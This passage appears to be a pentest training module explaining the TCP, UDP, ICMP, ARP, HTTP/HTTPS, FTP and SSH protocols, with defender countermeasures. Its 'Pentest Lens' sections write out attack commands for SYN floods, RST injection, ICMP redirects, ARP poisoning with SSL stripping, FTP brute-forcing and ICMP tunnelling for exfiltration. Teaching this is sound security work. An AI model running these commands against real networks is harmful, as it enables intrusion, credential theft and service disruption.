---
title: "Module 03 — Network Protocols Deep Dive"
tags: [networking, protocols, tcp, udp, icmp, arp, http, https, ftp, ssh, smtp, snmp, kerberos, rdp, llmnr, pentest, netgod]
module: 3
date: 2026-04-05
---

# Module 03 — Network Protocols Deep Dive

> [!info] Module Overview
> Every protocol covered in this module is taken to full depth: purpose, port numbers, packet/frame structure, handshake steps, Wireshark capture filter, and a full Pentest Lens section. This is the reference you pull up during an engagement when you need to know exactly what a protocol does, how it looks on the wire, and how to attack it.

---

## 1. TCP — Transmission Control Protocol

### Purpose and Ports
TCP provides **reliable, ordered, connection-oriented** delivery of data between applications. Before data is exchanged, a connection must be established. After exchange, the connection is terminated gracefully. TCP guarantees that all bytes arrive, in order, without corruption.

- **Protocol number**: 6 (appears in IP header Protocol field)
- **No fixed port** — TCP is a transport-layer protocol. Port numbers are defined by the application using TCP.

### TCP Header Structure

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E|U|A|P|R|S|F|                               |
| Offset|Reserv.|W|C|R|C|S|S|Y|I|         Window Size          |
|       |       |R|E|G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if Data Offset > 5)               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Field-by-field**:

| Field | Size | Description |
|-------|------|-------------|
| Source Port | 16 bits | Sending application's port |
| Destination Port | 16 bits | Receiving application's port |
| Sequence Number | 32 bits | Byte offset of first byte in this segment. Used for ordering and reassembly. |
| Acknowledgment Number | 32 bits | Next expected byte from the other side. Confirms receipt of all bytes up to this-1. |
| Data Offset | 4 bits | Header length in 32-bit words. Minimum 5 (20 bytes), max 15 (60 bytes with options). |
| Flags | 9 bits | Control bits — see below |
| Window Size | 16 bits | How many bytes the receiver can accept before requiring ACK. Flow control mechanism. |
| Checksum | 16 bits | Error detection — covers TCP header + data + pseudo-header |
| Urgent Pointer | 16 bits | If URG flag set, points to urgent data boundary |
| Options | Variable | MSS, SACK, timestamps, window scaling |

**TCP Flags**:
| Flag | Bit | Meaning |
|------|-----|---------|
| FIN | 0 | Finish — sender has no more data to send |
| SYN | 1 | Synchronise — initiates connection, carries ISN |
| RST | 2 | Reset — abruptly terminates connection |
| PSH | 3 | Push — deliver data to application immediately, don't buffer |
| ACK | 4 | Acknowledgment field is valid |
| URG | 5 | Urgent pointer field is valid |
| ECE | 6 | ECN-Echo (Explicit Congestion Notification) |
| CWR | 7 | Congestion Window Reduced |

### TCP 3-Way Handshake — Step by Step

```
Client                              Server
  |                                    |
  |--- SYN (SEQ=1000, SYN=1) -------->|  Client picks random ISN (1000)
  |                                    |  "I want to connect. My sequence starts at 1000."
  |                                    |
  |<-- SYN-ACK (SEQ=5000, ACK=1001) --|  Server picks its own ISN (5000)
  |                                    |  ACK=1001 = client's ISN+1 (confirms receipt)
  |                                    |  "OK. My sequence starts at 5000. Received your 1000."
  |                                    |
  |--- ACK (SEQ=1001, ACK=5001) ----->|  Client ACKs server's ISN+1
  |                                    |  "Received your 5000. Connection established."
  |                                    |
  |========= DATA TRANSFER ===========|
```

**ISN (Initial Sequence Number)**: Randomly chosen at connection setup to prevent session hijacking. Historically ISNs were predictable (incremental) — attackers could predict the next SEQ number and inject data into a connection without being on the wire. Modern OS implementations use cryptographically random ISNs.

**TCP Connection States**:
```
CLOSED → LISTEN (server) → SYN_RECEIVED → ESTABLISHED
CLOSED → SYN_SENT (client) → ESTABLISHED

Termination:
ESTABLISHED → FIN_WAIT_1 → FIN_WAIT_2 → TIME_WAIT → CLOSED (active close)
ESTABLISHED → CLOSE_WAIT → LAST_ACK → CLOSED (passive close)
```

**TIME_WAIT state**: After the active close side sends its final ACK, it waits 2×MSL (Maximum Segment Lifetime — 60s) before closing. This ensures the final ACK reaches the other side and prevents old segments from a previous connection being misinterpreted.

### TCP 4-Way Termination

```
Client                              Server
  |                                    |
  |--- FIN (SEQ=X) ------------------>|  "I'm done sending."
  |<-- ACK (ACK=X+1) -----------------|  "Got it."
  |                                    |  (Server may still be sending data)
  |<-- FIN (SEQ=Y) -------------------|  "I'm done too."
  |--- ACK (ACK=Y+1) ---------------->|  "Got it. Closing."
```

### TCP Flow Control — Sliding Window

The Window Size field controls how much data can be in-flight (sent but not yet acknowledged) at any time.

```
Window = 3 segments
SEQ 1 ──┐
SEQ 2 ──┤── In-flight (window)
SEQ 3 ──┘
SEQ 4     ← Cannot send until ACK received for SEQ 1
```

If the receiver's buffer is filling up, it reduces the window size in its ACKs. Window = 0 means "stop sending" (zero-window probe). This prevents a fast sender from overwhelming a slow receiver.

### Wireshark Filters — TCP

```
tcp                          # All TCP traffic
tcp.port == 80               # HTTP traffic
tcp.flags.syn == 1           # SYN packets (new connections)
tcp.flags.syn == 1 && tcp.flags.ack == 0  # Only SYN (not SYN-ACK) — connection initiations
tcp.flags.rst == 1           # RST packets — aborted connections
tcp.analysis.retransmission  # Retransmissions — indicates packet loss
tcp.window_size == 0         # Zero window — flow control stall
tcp.stream eq 5              # Follow specific TCP stream (stream 5)
```

### Pentest Lens — TCP

**Attacker's view**: TCP is the transport for nearly every exploitable service. Understanding TCP mechanics enables port scanning, banner grabbing, session hijacking, and crafting custom payloads.

**Port scanning** (Nmap TCP scan types):
```bash
# SYN scan (half-open) — fastest, stealthiest, requires root
# Sends SYN, waits for SYN-ACK (open) or RST (closed). Never completes handshake.
nmap -sS 192.168.1.0/24

# Full connect scan — completes 3-way handshake. Detectable, doesn't need root.
nmap -sT 192.168.1.1

# ACK scan — used to map firewall rules. Open AND closed ports return RST.
# Filtered ports return nothing (stateful firewall dropped it).
nmap -sA 192.168.1.1

# Window scan — like ACK scan but examines window size to distinguish open/closed
nmap -sW 192.168.1.1

# FIN/NULL/Xmas scans — bypass some firewalls by using non-SYN flags
# RFC compliant: closed port sends RST, open port ignores. Doesn't work on Windows.
nmap -sF 192.168.1.1    # FIN scan
nmap -sN 192.168.1.1    # NULL scan (no flags)
nmap -sX 192.168.1.1    # Xmas scan (FIN+PSH+URG)

# Timing — T0 (paranoid/slow) to T5 (insane/fast)
nmap -sS -T2 192.168.1.1    # Slow — evade IDS
nmap -sS -T4 192.168.1.1    # Fast — normal recon
```

**TCP Session Hijacking** (historical, mostly mitigated):
```
Attacker needs to predict: SEQ number + correct source IP/port
Modern OS: random ISN → prediction is infeasible without MITM position

With MITM position (e.g., post-ARP spoof):
1. Capture TCP stream between victim and server
2. Identify current SEQ/ACK numbers
3. Inject TCP segment with correct SEQ, spoofed source IP
4. Victim's real packets now have wrong SEQ → desync → send RST
```

**SYN Flood**:
```bash
# hping3 — craft raw TCP packets
hping3 -S --flood -V -p 80 <target>
# -S = SYN flag, --flood = send as fast as possible
# Exhausts server's SYN backlog — legitimate connections fail
# Modern mitigation: SYN cookies (server doesn't allocate state until handshake completes)
```

**RST injection** (tear down existing connections):
```bash
hping3 -R -p 80 -a <spoofed-source-IP> <target>
# Sends RST to port 80 — tears down any TCP session to that port
```

**Misconfigurations**:
- Services listening on non-standard ports (security through obscurity — still found by full-range scans)
- Predictable ISNs on embedded/legacy systems → session hijacking feasible
- No TCP rate limiting on edge → SYN flood effective

**Defender's counter**:
- SYN cookies (`net.ipv4.tcp_syncookies=1` on Linux)
- Rate limiting SYN packets at the firewall
- Connection tracking timeout tuning
- IDS signatures for port scan patterns

---

## 2. UDP — User Datagram Protocol

### Purpose and Structure

UDP is **connectionless, unreliable, and fast**. No handshake. No guaranteed delivery. No ordering. The application is responsible for any reliability it needs. UDP's simplicity makes it ideal for latency-sensitive applications.

- **Protocol number**: 17

**UDP Header** (only 8 bytes — compare to TCP's minimum 20):
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Length            |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

- **Length**: Total length of UDP header + data in bytes. Minimum 8 (header only).
- **Checksum**: Optional in IPv4 (0 = not calculated), mandatory in IPv6.

**Wireshark filter**: `udp` / `udp.port == 53`

### Pentest Lens — UDP

**UDP scanning**:
```bash
# UDP scan (slow — requires timeout for closed ports)
nmap -sU 192.168.1.1
nmap -sU -p 53,67,68,69,123,161,162,500,4500 192.168.1.1   # Common UDP ports

# UDP is harder to scan — closed ports send ICMP port-unreachable
# Open ports often don't respond unless given a valid payload
# Use version detection to send appropriate probes
nmap -sUV -p 161 192.168.1.1    # SNMP — sends SNMP GET

# hping3 UDP
hping3 -2 -p 161 192.168.1.1    # -2 = UDP mode
```

**UDP amplification DDoS** (requires spoofed source IP — attacker sends small request with victim's IP as source, server sends large response to victim):
```bash
# DNS amplification: small query → large ANY response
# NTP amplification: monlist command returns list of last 600 clients (~100x amplification)
# SNMP amplification: GetBulk request
# These are DDoS techniques — enumeration of vulnerable servers, not direct exploitation
```

---

## 3. ICMP — Internet Control Message Protocol

### Purpose and Structure

ICMP is used for **network diagnostics and error reporting**. It is not a transport protocol — no ports, no application data. ICMP operates at Layer 3 alongside IP.

- **Protocol number**: 1
- **No ports** — ICMP uses Type and Code fields instead

**ICMP Header**:
```
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Rest of Header                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Critical ICMP Types and Codes**:
| Type | Code | Name | Use |
|------|------|------|-----|
| 0 | 0 | Echo Reply | ping response |
| 3 | 0 | Destination Unreachable — Net Unreachable | No route to network |
| 3 | 1 | Destination Unreachable — Host Unreachable | Host not responding |
| 3 | 3 | Destination Unreachable — Port Unreachable | UDP: no process on port |
| 3 | 13 | Destination Unreachable — Communication Administratively Prohibited | Firewall blocked |
| 5 | 0 | Redirect — Redirect for Network | Router tells host to use better route |
| 8 | 0 | Echo Request | ping request |
| 11 | 0 | Time Exceeded — TTL Exceeded in Transit | traceroute mechanism |
| 11 | 1 | Time Exceeded — Fragment Reassembly Time Exceeded | |

**How ping works**:
```
Client → ICMP Type 8 (Echo Request) → Target
Target → ICMP Type 0 (Echo Reply) → Client

The Echo Request contains: Identifier (process ID), Sequence Number (increments), Data (timestamp)
Round-trip time = time between sending request and receiving reply
```

**How traceroute works**:
```
Send packet with TTL=1 → First router decrements TTL to 0 → Sends ICMP Type 11 (TTL Exceeded) → reveals router 1 IP
Send packet with TTL=2 → Second router decrements TTL to 0 → Sends ICMP Type 11 → reveals router 2 IP
...repeat until destination reached (sends ICMP Type 0 or ICMP Type 3 Port Unreachable for UDP traceroute)
```

```bash
# Linux traceroute (UDP by default, port 33434+)
traceroute google.com

# Windows tracert (ICMP Echo by default)
tracert google.com

# Force ICMP traceroute on Linux
traceroute -I google.com

# Force TCP traceroute (bypasses firewalls that block ICMP/UDP)
traceroute -T -p 80 google.com
```

**Wireshark filters**:
```
icmp                         # All ICMP
icmp.type == 8               # Echo requests (pings)
icmp.type == 0               # Echo replies
icmp.type == 3               # Destination unreachable
icmp.type == 11              # TTL exceeded (traceroute)
```

### Pentest Lens — ICMP

**Host discovery**:
```bash
# Ping sweep
nmap -sn -PE 192.168.1.0/24    # ICMP echo ping sweep
fping -a -g 192.168.1.0/24     # Faster ping sweep, only shows alive hosts
fping -a -g 192.168.1.0/24 2>/dev/null  # Suppress unreachable messages
```

**ICMP tunnelling** (data exfiltration / C2 through ICMP):
```bash
# icmptunnel — tunnel IP over ICMP echo (bypasses firewalls that allow ping)
# Server side
icmptunnel -s

# Client side
icmptunnel <server-IP>

# Creates tun interface — full IP connectivity through ICMP

# ptunnel-ng — more modern ICMP tunnel
ptunnel-ng -p <proxy-IP> -lp 8080 -da <dest-IP> -dp 22    # Tunnel SSH over ICMP
```

**ICMP redirect attack**:
```bash
# Send ICMP Type 5 (Redirect) to a host — tell it to use attacker's machine as gateway
# hping3
hping3 --icmp --icmptype 5 --icmpcode 1 -a <real-gateway> --icmp-gw <attacker-IP> <victim>
# Victim updates its routing cache — traffic for specified network goes to attacker
```

**Misconfigurations**:
- ICMP not blocked at perimeter → allows ping sweeps, OS fingerprinting, traceroute mapping of internal topology
- ICMP redirect enabled on hosts (`net.ipv4.conf.all.accept_redirects=1`) → ICMP redirect attack

**Defender's counter**:
- Block ICMP Echo at perimeter (affects ping troubleshooting — a tradeoff)
- Allow ICMP Type 3 (unreachable) and Type 11 (TTL exceeded) — needed for PMTUD and traceroute
- Disable ICMP redirects: `net.ipv4.conf.all.accept_redirects=0`
- Deploy ICMP anomaly detection — unusual ICMP payload sizes (tunnelling generates large ICMP packets)

---

## 4. ARP — Address Resolution Protocol

### Purpose

ARP resolves **IPv4 addresses to MAC addresses**. When a host wants to send a packet to an IP on the same subnet, it needs the MAC address to build the Ethernet frame. ARP provides this mapping.

- **Not routed** — ARP operates only within a single broadcast domain (Layer 2)
- **EtherType**: 0x0806 (identifies an Ethernet frame as carrying ARP)
- **No port numbers** — operates below Layer 4

### ARP Request/Reply — Step by Step

```
Host A (192.168.1.10, MAC: AA:AA:AA:AA:AA:AA) wants to send to Host B (192.168.1.20)

Step 1 — ARP Request (broadcast):
  Ethernet: Src=AA:AA:AA:AA:AA:AA, Dst=FF:FF:FF:FF:FF:FF (broadcast)
  ARP:
    Hardware Type: Ethernet (1)
    Protocol Type: IPv4 (0x0800)
    Hardware Addr Len: 6 (MAC = 6 bytes)
    Protocol Addr Len: 4 (IP = 4 bytes)
    Operation: Request (1)
    Sender MAC: AA:AA:AA:AA:AA:AA
    Sender IP:  192.168.1.10
    Target MAC: 00:00:00:00:00:00  ← Unknown — what we're asking for
    Target IP:  192.168.1.20

Step 2 — ARP Reply (unicast back to requester):
  Ethernet: Src=BB:BB:BB:BB:BB:BB, Dst=AA:AA:AA:AA:AA:AA
  ARP:
    Operation: Reply (2)
    Sender MAC: BB:BB:BB:BB:BB:BB  ← Host B's MAC — the answer
    Sender IP:  192.168.1.20
    Target MAC: AA:AA:AA:AA:AA:AA
    Target IP:  192.168.1.10
```

Host A caches `192.168.1.20 → BB:BB:BB:BB:BB:BB` in its ARP table with a timeout (typically 2–20 minutes depending on OS).

```bash
# View ARP cache
arp -a           # Windows and Linux
ip neigh show    # Linux (modern)

# Manually add static ARP entry (prevents ARP spoofing for specific hosts)
arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF   # Linux
netsh interface ip add neighbors "Ethernet" 192.168.1.1 AA-BB-CC-DD-EE-FF  # Windows
```

**Gratuitous ARP**: An ARP reply sent without a prior request. A host announces its own IP-to-MAC mapping to update other hosts' ARP caches. Used for:
- NIC replacement (new MAC for same IP)
- IP address changes
- Failover (HSRP/VRRP — new active router announces itself)
- **ARP spoofing attacks** — the same mechanism is abused

**Wireshark filter**: `arp` / `arp.opcode == 1` (request) / `arp.opcode == 2` (reply)

### Pentest Lens — ARP

**ARP Spoofing / ARP Poisoning** — the foundational Layer 2 MITM attack:

```bash
# Concept: Send gratuitous ARP replies telling:
#   - The victim: "The gateway MAC is MY MAC"
#   - The gateway: "The victim's MAC is MY MAC"
# All traffic between victim and gateway now flows through attacker

# Enable IP forwarding (so traffic is relayed, not dropped)
echo 1 > /proc/sys/net/ipv4/ip_forward
# Windows: Enable IP routing via registry or RRAS

# arpspoof (from dsniff)
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # Tell victim: gateway MAC = mine
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10   # Tell gateway: victim MAC = mine
# Run both simultaneously (two terminal windows)

# Bettercap (more capable, modern tool)
bettercap -iface eth0
> net.probe on                          # Discover hosts
> set arp.spoof.targets 192.168.1.10    # Target specific host
> arp.spoof on                          # Begin poisoning
> net.sniff on                          # Capture traffic

# Once MITM established — what you can do:
# 1. Capture credentials in cleartext protocols (HTTP, FTP, Telnet)
# 2. SSL stripping (force HTTPS → HTTP)
# 3. DNS spoofing (redirect specific domains)
# 4. Inject JavaScript into HTTP pages
```

**ARP scanning** (host discovery at Layer 2):
```bash
arp-scan --localnet              # Scan local subnet via ARP
arp-scan -I eth0 192.168.1.0/24  # Specify interface and range
# ARP-based discovery cannot be blocked by host firewalls (operates below IP)
# Finds hosts that block ICMP pings

nmap -sn -PR 192.168.1.0/24     # Nmap ARP ping discovery
```

**Misconfigurations**:
- No Dynamic ARP Inspection (DAI) on switches → ARP spoofing unrestricted
- No static ARP entries for critical hosts (gateway, DNS, DC) → easily poisoned
- Flat network — ARP spoofing affects entire broadcast domain

**Defender's counter**:
- DAI on switches (covered in Module 2)
- XArp — ARP monitoring tool for Windows
- Static ARP entries for gateways and servers
- Private VLANs — restrict which ports can ARP to each other
- Detection: monitor for duplicate IP → MAC mappings, or a single MAC claiming multiple IPs

---

## 5. HTTP and HTTPS

### HTTP — HyperText Transfer Protocol

- **Port**: TCP 80
- **Version**: HTTP/1.0, HTTP/1.1 (most common), HTTP/2, HTTP/3 (over QUIC/UDP)
- **Stateless**: Each request is independent. Sessions maintained via cookies.

**HTTP Request Structure**:
```
GET /index.html HTTP/1.1\r\n
Host: www.example.com\r\n
User-Agent: Mozilla/5.0\r\n
Accept: text/html,application/xhtml+xml\r\n
Accept-Language: en-GB,en;q=0.9\r\n
Cookie: sessionid=abc123\r\n
Connection: keep-alive\r\n
\r\n
[Request body — for POST/PUT only]
```

**HTTP Response Structure**:
```
HTTP/1.1 200 OK\r\n
Date: Sun, 05 Apr 2026 10:00:00 GMT\r\n
Server: Apache/2.4.41\r\n
Content-Type: text/html; charset=UTF-8\r\n
Content-Length: 1234\r\n
Set-Cookie: sessionid=newvalue; HttpOnly; Secure\r\n
\r\n
[HTML body]
```

**HTTP Methods**:
| Method | Purpose | Has Body |
|--------|---------|---------|
| GET | Retrieve resource | No |
| POST | Submit data, create resource | Yes |
| PUT | Replace resource | Yes |
| PATCH | Partially update resource | Yes |
| DELETE | Delete resource | No |
| HEAD | Like GET but no body in response — get headers only | No |
| OPTIONS | List allowed methods | No |
| TRACE | Echo request back — used for debugging (often disabled) | No |

**HTTP Status Codes**:
| Range | Category | Examples |
|-------|---------|---------|
| 1xx | Informational | 100 Continue |
| 2xx | Success | 200 OK, 201 Created, 204 No Content |
| 3xx | Redirect | 301 Moved Permanently, 302 Found, 304 Not Modified |
| 4xx | Client Error | 400 Bad Request, 401 Unauthorised, 403 Forbidden, 404 Not Found, 429 Too Many Requests |
| 5xx | Server Error | 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable |

**Security-relevant headers**:
| Header | Purpose |
|--------|---------|
| `Strict-Transport-Security` | Force HTTPS (HSTS) |
| `Content-Security-Policy` | Restrict resource loading (XSS mitigation) |
| `X-Frame-Options` | Prevent clickjacking |
| `X-Content-Type-Options: nosniff` | Prevent MIME sniffing |
| `Set-Cookie: HttpOnly; Secure; SameSite=Strict` | Cookie security flags |
| `Server:` | Leaks web server type and version — should be suppressed |
| `X-Powered-By:` | Leaks backend technology — should be removed |

### HTTPS — HTTP Secure

HTTPS = HTTP transported over TLS (Transport Layer Security). TLS provides:
- **Confidentiality**: Encrypted traffic — cannot be read by passive eavesdroppers
- **Integrity**: MAC (Message Authentication Code) ensures data wasn't tampered with
- **Authentication**: Server certificate proves the server's identity

**Port**: TCP 443

**TLS Handshake (TLS 1.2)**:
```
Client                                          Server
  |                                               |
  |--- ClientHello ─────────────────────────────>|
  |    TLS version, random bytes, cipher suites  |
  |    supported extensions                      |
  |                                               |
  |<── ServerHello ──────────────────────────────|
  |    Chosen TLS version, random bytes          |
  |    Chosen cipher suite                       |
  |                                               |
  |<── Certificate ──────────────────────────────|
  |    Server's X.509 certificate                |
  |    Client verifies: signed by trusted CA?    |
  |    Hostname matches? Not expired?            |
  |                                               |
  |<── ServerHelloDone ──────────────────────────|
  |                                               |
  |--- ClientKeyExchange ────────────────────────>|
  |    Pre-master secret (encrypted with         |
  |    server's public key from certificate)     |
  |                                               |
  |--- ChangeCipherSpec ─────────────────────────>|
  |--- Finished (encrypted) ────────────────────>|
  |                                               |
  |<── ChangeCipherSpec ─────────────────────────|
  |<── Finished (encrypted) ─────────────────────|
  |                                               |
  |========== Encrypted HTTP Traffic ============|
```

**TLS 1.3** (current standard) eliminates several steps — 1-RTT instead of 2-RTT, removed RSA key exchange (only forward-secret cipher suites), removed weak algorithms.

**Cipher suite notation** (TLS 1.2): `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384`
- Key Exchange: `ECDHE` (Elliptic Curve Diffie-Hellman Ephemeral — provides Perfect Forward Secrecy)
- Authentication: `RSA` (server certificate uses RSA)
- Bulk Encryption: `AES_256_GCM` (AES with 256-bit key in GCM mode)
- MAC: `SHA384`

**Wireshark filters**:
```
http                         # All HTTP (cleartext only)
http.request                 # HTTP requests
http.response                # HTTP responses
http.request.method == "POST" # POST requests (credentials often here)
http.cookie                  # Requests with cookies
tls                          # TLS handshakes and records
tls.handshake.type == 1      # ClientHello
tls.handshake.type == 11     # Certificate
ssl.app_data                 # TLS application data (encrypted — can't read without key)
```

### Pentest Lens — HTTP/HTTPS

**Enumeration**:
```bash
# Banner grab — identify server software
curl -I http://target.com                    # HTTP headers only
curl -I https://target.com

# Directory/file brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,txt

# feroxbuster — recursive directory brute force
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt

# nikto — web server vulnerability scanner
nikto -h http://target.com
nikto -h https://target.com -ssl

# Check TLS configuration
testssl.sh https://target.com               # Comprehensive TLS analysis
nmap --script ssl-enum-ciphers -p 443 target.com

# whatweb — technology fingerprinting
whatweb http://target.com
```

**SSL Stripping** (requires MITM position):
```bash
# bettercap SSL stripping
bettercap -iface eth0
> arp.spoof on
> set https.proxy.sslstrip true
> https.proxy on
# Victim's HTTPS connections downgraded to HTTP — credentials visible
# Largely mitigated by HSTS preloading
```

**Misconfigurations**:
- HTTP (port 80) serving sensitive content without redirect to HTTPS
- Weak TLS versions enabled (TLS 1.0/1.1 — deprecated, vulnerable to BEAST, POODLE)
- Weak cipher suites (RC4, DES, export-grade ciphers)
- Missing `HttpOnly` / `Secure` cookie flags → session cookies readable via XSS / accessible over HTTP
- Missing security headers (CSP, HSTS, X-Frame-Options)
- Directory listing enabled on web server
- Server header leaking exact software version

**Defender's counter**:
- Redirect HTTP → HTTPS, set HSTS with long max-age, include in preload list
- Disable TLS 1.0/1.1, allow only TLS 1.2 and 1.3
- Only allow cipher suites with PFS (ECDHE key exchange)
- Configure all security headers
- Suppress Server and X-Powered-By headers

---

## 6. FTP, SFTP, FTPS

### FTP — File Transfer Protocol

- **Ports**: TCP 21 (control channel), TCP 20 (data channel — active mode)
- **Authentication**: Username/password in cleartext
- **Encryption**: None — all data, including credentials, sent in cleartext

**FTP has two operational modes**:

**Active Mode**:
```
Client → Server port 21: "Connect to me at <client-IP>:<port> for data"
Server → Client: Initiates data connection FROM server port 20 TO client's specified port
Problem: Client's firewall often blocks incoming connections from server
```

**Passive Mode (PASV)** — most commonly used today:
```
Client → Server port 21: "Give me a port I can connect to for data"
Server → Client: "Connect to me at <server-IP>:<random-high-port>"
Client → Server: Initiates data connection TO server's specified port
Firewall-friendly: Client initiates both connections
```

**FTP Commands** (sent as plaintext on the control channel):
```
USER <username>    → Send username
PASS <password>    → Send password (CLEARTEXT!)
LIST               → List directory contents
RETR <filename>    → Download file
STOR <filename>    → Upload file
QUIT               → Disconnect
PASV               → Request passive mode
PORT h1,h2,h3,h4,p1,p2  → Specify active mode connection parameters
```

```bash
# Connect to FTP
ftp 192.168.1.10
ftp -n 192.168.1.10    # Suppress auto-login

# Nmap FTP scripts
nmap --script ftp-anon -p 21 192.168.1.10        # Check anonymous login
nmap --script ftp-brute -p 21 192.168.1.10       # Brute force credentials
nmap --script ftp-bounce -p 21 192.168.1.10      # Test for FTP bounce

# Capture FTP credentials in Wireshark
# Filter: ftp → look for USER and PASS commands in plaintext
```

### SFTP — SSH File Transfer Protocol

**Not related to FTP** despite the name. SFTP is a subsystem of SSH — file transfer over an encrypted SSH connection.
- **Port**: TCP 22 (same as SSH)
- **Authentication**: SSH keys or password (encrypted)
- **All data encrypted**

```bash
sftp user@192.168.1.10
sftp -i ~/.ssh/id_rsa user@192.168.1.10   # Key-based auth
```

### FTPS — FTP over TLS

FTP with TLS encryption added. Two modes:
- **Explicit FTPS (FTPS)**: Client connects to port 21, then upgrades to TLS with AUTH TLS command
- **Implicit FTPS**: Client connects to port 990 already expecting TLS

### Pentest Lens — FTP

**Anonymous FTP login** — many FTP servers allow login with username `anonymous` and any password (convention: use your email). Common finding in pen tests and CTFs.

```bash
# Test anonymous login manually
ftp 192.168.1.10
> Username: anonymous
> Password: anything@example.com
> ls -la    # List all files including hidden

# Nmap automated check
nmap --script ftp-anon -p 21 192.168.1.10

# Hydra — brute force FTP credentials
hydra -L users.txt -P passwords.txt ftp://192.168.1.10
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10 -t 4
```

**FTP credential capture** (plaintext):
```bash
# If MITM is established, FTP credentials visible in plain text
# Wireshark: filter ftp, look for PASS command
# Bettercap will automatically capture and display them
```

**FTP bounce attack** (legacy, mostly patched):
Use the FTP PORT command to make the FTP server connect to a third-party host and port. Historically used to port scan internal hosts through an FTP server in the DMZ.

**Misconfigurations**:
- Anonymous login enabled with write access → upload webshells or malware
- FTP credentials are the same as system login credentials → escalation to SSH
- FTP used instead of SFTP → credentials captured on wire

**Defender's counter**:
- Replace FTP with SFTP or FTPS entirely
- If FTP required: disable anonymous login, enforce strong passwords, use FTPS
- Restrict FTP to specific source IPs where possible
- Monitor for anonymous logins and large file transfers

---

## 7. SSH — Secure Shell

### Purpose and Port

SSH provides **encrypted remote shell access**, file transfer (SFTP/SCP), and port forwarding (tunnelling). It replaces Telnet, rsh, and rcp.

- **Port**: TCP 22
- **Protocol version**: SSH-2 (SSH-1 is deprecated and broken — never use)

### SSH Handshake and Key Exchange

```
Client                                        Server
  |                                               |
  |--- TCP SYN ─────────────────────────────────>|
  |<── TCP SYN-ACK ──────────────────────────────|
  |--- TCP ACK ─────────────────────────────────>|
  |                                               |
  |<── SSH Banner ────────────────────────────────|
  |    "SSH-2.0-OpenSSH_8.9p1"                   |
  |--- SSH Banner ────────────────────────────────>|
  |    "SSH-2.0-OpenSSH_8.9p1"                   |
  |                                               |
  |=== SSH_MSG_KEXINIT (algorithm negotiation) ===|
  |    Both sides advertise supported:            |
  |    - Key exchange algorithms (ECDH, DH)       |
  |    - Host key algorithms (RSA, Ed25519)       |
  |    - Encryption algorithms (AES-GCM, ChaCha)  |
  |    - MAC algorithms                           |
  |                                               |
  |=== Key Exchange (e.g., ECDH) ================|
  |    Client sends ephemeral public key          |
  |    Server responds with ephemeral public key  |
  |    + host key signature + session ID         |
  |    Shared secret derived via DH math         |
  |                                               |
  |=== SSH_MSG_NEWKEYS ===========================|
  |    Both sides switch to encrypted comms      |
  |                                               |
  |=== Authentication ============================|
  |    Password auth: password sent encrypted    |
  |    Key auth: client signs challenge with    |
  |              private key → server verifies   |
  |              with stored public key          |
  |                                               |
  |=== Encrypted SSH Session =====================|
```

**SSH Host Key Verification**:
First time connecting to a server, SSH warns that the host key is unknown:
```
The authenticity of host '192.168.1.10 (192.168.1.10)' can't be established.
ED25519 key fingerprint is SHA256:abc123...
Are you sure you want to continue connecting (yes/no)?
```
If you accept, the fingerprint is stored in `~/.ssh/known_hosts`. On future connections, if the fingerprint changes → SSH warns of a possible MITM attack.

**SSH Configuration** (`/etc/ssh/sshd_config`):
```bash
